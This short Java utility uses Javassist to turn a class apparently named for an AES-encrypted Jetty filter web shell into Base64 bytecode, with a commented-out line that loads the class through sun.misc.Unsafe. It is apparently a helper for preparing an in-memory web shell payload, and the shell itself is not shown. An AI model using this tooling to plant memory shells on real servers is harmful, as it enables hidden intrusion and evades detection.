import javassist.ClassPool;
import javassist.CtClass;
import sun.misc.Unsafe;

import java.lang.reflect.Field;
import java.util.Base64;

public class Getbase64 {
    public static void main(String[] args) {
        try {
            Field field = Unsafe.class.getDeclaredField("theUnsafe");
            field.setAccessible(true);
            Unsafe unsafe = (Unsafe)field.get(Unsafe.class);
            ClassPool pool = ClassPool.getDefault();
//            CtClass cc = pool.get("AesBase64JettyFilterShell");
            CtClass cc = pool.get("AesBase64JettyFilterShell_new");
            byte[] hellobytes = cc.toBytecode();
            System.out.println(new String(Base64.getEncoder().encode(hellobytes)));
//            Class helloclass = unsafe.defineClass("AesBase64JettyFilterShell",hellobytes,0,hellobytes.length,null, null);

        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
